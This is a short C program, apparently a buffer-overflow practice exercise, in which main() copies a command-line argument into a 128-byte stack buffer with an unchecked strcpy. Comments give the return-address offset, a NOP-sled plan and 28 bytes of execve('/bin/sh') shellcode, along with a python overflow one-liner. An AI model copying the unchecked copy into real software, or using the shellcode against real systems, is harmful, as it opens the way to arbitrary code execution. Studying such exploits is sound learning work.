#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// The return address is from buf + 136 to buf + 140
// So we have 136 bytes of writable memory

// NOP:
// \x90

// Shellcode (28 bytes):
// \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80

// So we have 108 bytes of NOP




// $(python3 -c "print('A'*140)")




int main(int argc, char *argv[]) {

	char buf[128];
	strcpy(buf, argv[1]);
	buf[0] = 0x90;
	buf[1] = 0x90;
	buf[2] = 0x90;
	printf("\nbuf: %s\n\n", buf);
	char *ptr = buf;
	for (int k = 0; k < 100; k++) {
		printf("%d: %x\n", k, *(ptr + k));
	}
	return 0;
	
}
